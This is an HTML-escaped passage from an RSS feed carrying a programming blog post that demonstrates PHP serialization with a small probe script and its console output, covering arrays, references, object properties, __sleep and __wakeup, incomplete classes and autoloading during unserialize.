&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;To be serialized&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;priv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;prot&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pub&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Just unserialized.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show_unserialize2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;spl_autoload_register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;define_democlass&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Please start with &amp;#39;ser&amp;#39; or &amp;#39;unser&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ser1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_serialize1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ser2&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_serialize2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ser3&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_serialize3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ser4&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_serialize4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;unser1&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_unserialize1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;unser2&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;show_unserialize2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Wot?&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can use this to see what serialized data looks like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php ser1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; cat demo&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;i:1; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;More complicated stuff such as arrays:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php ser2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; cat demo&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;a:3:{i:0;s:5:&amp;#34;fnorp&amp;#34;;i:1;s:5:&amp;#34;glorp&amp;#34;;i:2;s:4:&amp;#34;dorp&amp;#34;;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Also, references half-work, if they are internal:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php ser4 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;References inside an array work: 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Array ( [0] =&amp;gt; 2 [1] =&amp;gt; 2 ) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;References across unserialize: 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;b is unserialized a:Array ( [0] =&amp;gt; 2 [1] =&amp;gt; 2 ) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Does the ref still work? 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Array ( [0] =&amp;gt; 3 [1] =&amp;gt; 3 ) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;but serializing a reference $b that points to $a does not work: The value $b
is referencing is saved, and the unserialized variable will have a value,
but will not reference the previous value. There is no error or warning.&lt;/p&gt;
&lt;p&gt;Here is what we do to Objects:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php ser3&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; cat demo&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Constructed. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;To be serialized 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;O:9:&amp;#34;DemoClass&amp;#34;:3:{s:15:&amp;#34;DemoClasspriv&amp;#34;;s:4:&amp;#34;priv&amp;#34;;s:7:&amp;#34;\*prot&amp;#34;;s:4:&amp;#34;prot&amp;#34;;s:3:&amp;#34;pub&amp;#34;;s:3:&amp;#34;pub&amp;#34;;} 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This shows how the contructor is being executed, how the &lt;code&gt;__sleep()&lt;/code&gt;
callback is called and the content of the serialized file with the
stringified DemoClass instance referencing the class name. If we load this
without DemoClass being defined, we get&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php unser1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;__PHP_Incomplete_Class Object ( 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [__PHP_Incomplete_Class_Name] =&amp;gt; DemoClass 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [priv:DemoClass:private] =&amp;gt; priv 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [prot:protected] =&amp;gt; prot 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [pub] =&amp;gt; pub 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can load DemoClass using an autoloader we define. Then we get&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; ./probe.php unser2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;We want DemoClass defined. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Just unserialized. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;DemoClass Object ( 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [priv:DemoClass:private] =&amp;gt; priv 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [prot:protected] =&amp;gt; prot 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  [pub] =&amp;gt; pub 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can see the Autoloader being called, the &lt;code&gt;__wakeup()&lt;/code&gt; function running
(it didn&amp;rsquo;t in the example before!) and then the properly re-instantiated
object.&lt;/p&gt;
&lt;p&gt;Note that our new version of DemoClass, as defined by the autoloader, does
define different default values for the instance variables so we can show
that the values from the file are being loaded.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>

